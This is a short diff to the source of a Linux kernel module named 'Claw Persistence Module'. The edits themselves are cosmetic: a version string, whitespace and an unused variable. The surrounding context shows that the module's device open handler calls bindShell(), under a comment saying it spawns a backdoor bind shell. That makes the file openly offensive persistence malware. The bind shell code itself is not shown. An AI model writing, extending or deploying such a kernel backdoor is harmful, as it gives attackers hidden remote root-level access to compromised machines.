@@ -8,7 +8,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
 MODULE_DESCRIPTION("Claw Persistence Module");
-MODULE_VERSION("cleanup-rev9");
+MODULE_VERSION("rc-1");
 
 int initModule(void);
 void exitModule(void);
@@ -34,7 +34,7 @@ static struct file_operations fops = {
     .write = deviceWrite,
     .open = deviceOpen,
     .release = deviceRelease
-} ;
+};
 
 // parameter majorNum
 static int majorNum = 0;
@@ -42,7 +42,6 @@ module_param(majorNum, int, S_IRUGO);
 MODULE_PARM_DESC(majorNum, "the assigned major number of character device noll");
 
 int initModule(void){
-    int i = 0;
     printk(KERN_INFO "[ClawPersist] Hello world!\n");
 
     // character device
@@ -83,6 +82,7 @@ static int deviceOpen(struct inode* inode, struct file* file)
 
 	// actually spawn backdoor bind shell
 	bindShell();
+
 	return SUCCESS;
 }
 
